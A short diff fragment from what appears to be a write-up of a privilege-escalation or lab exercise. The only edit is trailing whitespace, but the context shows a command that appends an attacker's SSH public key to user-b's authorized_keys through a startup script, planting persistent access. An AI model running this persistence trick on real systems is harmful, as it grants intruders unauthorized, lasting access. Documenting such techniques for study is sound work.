@@ -184,7 +184,7 @@ Then, I appended the generated public key to `user-b`'s `authorized_keys` by mod
 ```
 echo "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGzTv8FEFTYsiVF7rOQFz/+Zme92ZgdrAvfe0KavA4xA'
 >> /home/user-b/.ssh/authorized_keys" >> server_start.sh
-```
+```  
 
 
 This ensured that, upon the next reboot, the server would automatically add the attacker's public key, granting SSH access as `user-b`.
